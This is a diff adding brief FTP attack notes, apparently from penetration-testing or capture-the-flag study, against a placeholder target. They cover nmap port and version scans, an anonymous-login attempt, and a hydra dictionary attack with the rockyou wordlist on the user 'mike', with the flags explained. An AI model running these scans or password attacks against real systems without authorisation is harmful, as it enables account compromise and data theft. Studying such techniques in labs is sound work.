@@ -1,0 +1,22 @@
+# FTP
+nmap -sT -p- <target_ip>
+
+# getting service information using the flag -sV
+nmap -sT -sV -p21 <target_ip>
+
+# trying for anonymous login, type in "anonymous" and give no password.
+ftp <target_ip>
+
+# see what you can find
+# look for usernames, sensitive files, etc.,
+
+# if you got a user name then you can use hydra to do a dictionary attack
+# it can perform dictionary attacks against more than 50 protocols including, RDP,SSH,Telnet,HTTP,HTTPS,SMB, serveral databases and much more.
+
+hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV <target_ip> ftp
+
+-t 4 suggests the number of parallel connections
+-l [user] Points to the user whose account you are trying to compromise
+-P [path to dictionary] points to the dictionary containing the list of possible passwords.
+
+# after cracking the password, login with mike user and find out the files of interest
